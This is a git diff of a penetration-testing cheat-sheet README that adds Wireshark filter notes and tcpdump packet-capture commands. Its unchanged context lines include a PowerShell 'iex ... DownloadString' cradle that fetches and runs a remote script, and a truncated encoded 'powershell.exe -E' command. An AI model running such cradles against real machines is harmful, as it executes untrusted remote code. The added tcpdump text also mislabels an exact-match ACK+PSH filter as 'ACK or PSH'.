@@ -27,6 +27,8 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Netcat](#netcat)
   - [Socat](#socat)
   - [PowerShell](#powershell)
+  - [WireShark](#wireshark)
+  - [Tcpdump](#tcpdump)
   - [Others](#others)
 - [Content Discovery](#content-discovery)
   - [Google Dorking](#google-dorking)
@@ -513,6 +515,41 @@ iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 ```
 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHI...
 ```
+
+
+### <ins>WireShark</ins>
+
+**Filters**
+- `net 10.11.1.0/24`, capture traffic only on the `10.11.1.0/24` address range
+
+**Display filters**
+- `tcp.port == 21`, only display FTP data
+
+**Misc operations**
+- Follow TCP stream: `Right-click` > `Follow` > `TCP Stream`
+
+### <ins>Tcpdump</ins>
+
+```
+tcpdump -r packets.pcap                                                           Read packet capture
+tcpdump -n -r packets.pcap | awk -F" " '{print $3}' | sort | uniq -c | head       Read and filter the packet capture;
+                                                                                       -n option to skip DNS name lookups, -r to read from our packet capture file
+                                                                                       awk to print the destination IP address and port, sort and uniq -c to sort and count the number of times the field appears in the capture, respectively, head to only display the first 10 lines of the output
+tcpdump -n src host 172.16.40.10 -r packets.pcap                                  Tcpdump filters; src host to output only source traffic
+tcpdump -n dst host 172.16.40.10 -r packets.pcap                                  Tcpdump filters; dst host to output only destination traffic
+tcpdump -n port 81 -r packets.pcap                                                Tcpdump filters; filter by port number
+tcpdump -nX -r packets.pcap                                                       -X to print packet data in both HEX and ASCII format
+```
+
+**Advanced Header Filtering: display only the data packets**
+
+1. Look for packets that have the `PSH` and `ACK` flags turned on
+   - The `ACK` flag will be set for all packets sent and received after the initial 3-way handshake
+   - In interactive Application Layer protocols, the `PSH` flag is frequently used to guarantee rapid delivery of a packet and prevent buffering.
+2. TCP flags are defined starting from the 14th byte
+   - `ACK` and `PSH` are represented by the fourth and fifth bits of the 14th byte
+   - Turning on these bits would result in `00011000` = `24` in decimal, verify it with `echo "$((2#00011000))"`
+3. To display packets that have the ACK or PSH flags set: `sudo tcpdump -A -n 'tcp[13] = 24' -r packets.pcap`
 
 
 ### <ins>Others</ins>
